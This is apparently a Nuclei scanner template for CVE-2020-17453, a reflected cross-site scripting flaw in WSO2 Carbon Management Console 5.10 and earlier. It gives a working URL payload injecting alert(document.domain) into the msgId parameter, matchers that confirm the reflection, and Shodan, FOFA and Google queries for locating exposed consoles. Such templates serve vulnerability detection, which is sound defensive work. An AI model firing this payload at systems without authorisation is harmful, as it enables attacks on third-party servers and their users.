id: CVE-2020-17453

info:
  name: WSO2 Carbon Management Console <=5.10 - Cross-Site Scripting
  author: madrobot
  severity: medium
  description: WSO2 Management Console through 5.10 is susceptible to reflected cross-site scripting which can be exploited by tampering a request parameter in Management Console. This can be performed in both authenticated and unauthenticated requests.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to potential data theft, session hijacking, or defacement of the affected application.
  remediation: |
    Upgrade to a patched version of WSO2 Carbon Management Console (5.11 or above) or apply the provided security patch to mitigate this vulnerability.
  reference:
    - https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2020-1132
    - https://nvd.nist.gov/vuln/detail/CVE-2020-17453
    - https://twitter.com/JacksonHHax/status/1374681422678519813
    - https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2021/WSO2-2020-1132/
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-17453
    cwe-id: CWE-79
    epss-score: 0.60645
    epss-percentile: 0.98245
    cpe: cpe:2.3:a:wso2:api_manager:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: wso2
    product: api_manager
    shodan-query: http.favicon.hash:1398055326
    fofa-query: icon_hash=1398055326
    google-query: inurl:"carbon/admin/login"
  tags: cve2020,cve,xss,wso2,vkev,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/carbon/admin/login.jsp?msgId=%27%3Balert(%27document.domain%27)%2F%2F'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "'';alert('document.domain')//';"

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
# digest: 4a0a004730450221008dda6ed1125e8df32eac1c313701c895e2e03d4ff9803c24441a00cc43668826022004d6deb33c5e80ce23ca55a49f7b826c3f432a42f64db71e3f5b18aa07a095f6:922c64590222798bb761d5b6d8e72950